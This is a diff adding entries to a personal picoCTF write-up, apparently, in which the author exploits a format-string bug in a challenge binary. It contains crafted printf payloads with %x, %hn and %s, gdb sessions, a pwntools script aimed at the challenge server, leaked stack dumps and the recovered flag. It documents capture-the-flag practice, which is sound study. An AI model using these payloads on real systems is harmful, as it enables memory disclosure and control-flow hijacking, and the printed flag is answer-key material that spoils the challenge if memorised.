@@ -94,3 +94,92 @@ Back again a week later
 -----------------------------------
 I think the ideas in https://tcode2k16.github.io/blog/posts/picoctf-2018-writeup/binary-exploitation
 will be useful; especially in the rop chain challenge section. My guess is that I can return from vuln to readflag, and also set the base pointer to vuln entrance again, so that I can keep exploiting the printfs and print the buffer.
+
+The address of vuln is 0x08049333, which is conviniently not to far after readflag address.
+After running that last gdb statement again, I noticed that after vuln returns to readflag,
+readflag tries to return to 0x00000001 but get seg fault. 
+The 0x00000001 is stored in memory 0xffffb700 (immediately after the 4 bytes of readflag target address that we put in the return address space.
+Knowing what I now do about the stack, this makes sense, since that is the base pointer (I think) which is the return address 
+for the function we are returning to. So I just need to set that location to store
+0x08049333, set the following 4 bytes to the buffer pointer, and the following 4 to a number >= 64.
+If this works, readflag will return to start of vuln, flag will be in buffer, and I will just need 
+to use a %s in the input to print it.
+
+run < <(echo -ne "\xfc\xb6\xff\xff\x02\xb7\xff\xff%x%x%37534x%hn%n")
+This writes target address into its spot, and also edits the higher order 2 bytes of the base pointer spot.
+I realize I'll have to switch things around a little since we need to write 0x0804 into those 
+higher order two bytes first, then continue printing chars to get to 0x92b6 and %hn that into
+low order 2 bytes of return address spot, then add more chars to get to 0x9333 and put that in low order 2 bytes of base pointer spot.
+For convinience in printing specified number of chars, I'll but a padding word onto the stack in
+between each mem address that I want to write to, so that I can %x to take that padding off
+and print a certain number of chars.
+I might have to worry about sending arguments as well, but I'll worry about that next.
+
+So run < <(echo -ne "\x02\xb7\xff\xff\aaaa\xfc\xb6\xff\xffaaaa\xfe\xb6\xff\xff\%8x%8x%2015x%hn%3556x%hn%125x%hn")
+36 chars before third %x, so 0x804 = 2052 and 2052-36-1 = 2015
+then 0x92b6 - 0x804 = 35536
+and 0x9333 - 0x92b6 = 125
+That input was causing a weird segmentation fault, so I went into disass vuln to add another
+break point and noticed that vuln calls readflag...VULN CALLS READFLAG!!!!!!!!
+How was I so blind to miss that? This whole time I've been preparing to do an exploit call of
+readflag, and the readflag statement in vuln was just sitting there in front of me. Yikes!
+I guess it's time to restart and complete the (somewhat easier) actual challenge.
+
+It's now just a matter of finding the address of where the flag buffer starts, and using %s
+to print from it. After setting a breakpoint just after the scanf call in vuln,
+I see with "info frame" that Locals at 0xffffb61c. The first local holds 0x08049385; neither that
+nor the second looks like a good place in memory. So I breakpointed just after readflag returned.
+Now the second local is 0xffffb6b0.
+Looking at that area with (gdb) x/100x 0xffffb6b0, I notice that the first word contains 0x6f636970, which 
+is hex for pico (which is the contents of my debugging flag.txt), so this is it.
+
+It's just a matter of sticking that address into the first word of story buffer, popping off
+the top three stack items to get the pointer to that word, and using %s to print the string
+found at that address. Here it goes...
+(gdb) run < <(echo -ne "\xb0\xb6\xff\xff%x%x%x%s")
+Works! 
+
+(echo -ne  "\xb0\xb6\xff\xff%x%x%x%s"; cat) | nc -vv saturn.picoctf.net 52932
+This did not work...strange.
+
+I tried python
+> from pwn import *
+> r = remote("saturn.picoctf.net", 52932)
+> r.sendlineafter("Tell me a story and then I'll tell you one >> ", p32(0xffffb6b0) + "%x%x%x%s".encode('utf-8'))
+> r.recv()
+
+but that didn't work either. Strangely, nothing was showing up from the %x commands.
+So I tried the same thing, but with just a 9 %x statements and no %s, and got
+b"Here's a story - \n\xb0\xb6\xff\xffffe1d5a0ffe1d5c08049346ffffb6b078257825782578257825782578257825ff007825\n"
+so it looks like I need 4.
+Actually, I think the problem is that the stack is different on the remote server. So I have to
+find a way to figure out the address of the flag buffer pointer.
+
+I noticed in gdb local, that inputting just %x outputs ffffb630, which is the pointer to the start of story buffer,
+and that ffffb6b0 (the flag buff pointer) is 128 (64 bytes) more, as expected.
+
+I have another idea. Since the top stack item is the pointer to the story buffer, if I can
+enter enough characters to fill the memory from the start of the story buffer to the start of 
+the flag buffer, then putting a %s at the beginning should print the entire contiguous block of text. 
+No matter how many chars I put in, however, a null character gets put at the 128 place and no more get saved, which must just 
+be part of how scanf works (since the code has specified the number of bytes to read), so the exploit must be in the printf
+
+I think I finally realized how to do it... If I just put enough %x in, it will end up printing the words that make up the flag.
+r.sendlineafter("Tell me a story and then I'll tell you one >> ", "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x".encode('utf-8'))
+and the output:
+b"Here's a story - \nffc23b40ffc23b608049346782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578252578256f6369707b4654436b34334c5f676e3167346c466666305f3474535f365f6b63336165617d633763fbad2000bcb547000f7f3a990804c00080494100804c000ffc23c2880494182ffc23cd4ffc23ce00ffc23c4000f7d30ee5\n"
+
+Sure enough, the output string contains 6f636970 (hex ocip due to the endieness). I noticed that
+there is the word "bad" in there too, so I copied the hex starting with the 6f and ending just before bad,
+and it translates to
+ocip{FTCk43L_gn1g4lFff0_4tS_6_kc3aea}c7c
+
+so I just need to run the python
+> flag = ""
+> s = "ocip{FTCk43L_gn1g4lFff0_4tS_6_kc3aea}c7c"
+> for i in range(0, len(s), 4):
+	flag += s[i+3] + s[i+2] + s[i+1] + s[i]
+> print(flag)
+picoCTF{L34k1ng_Fl4g_0ff_St4ck_6aea3c7c}
+
+Phew; it feels so good to be done that one.
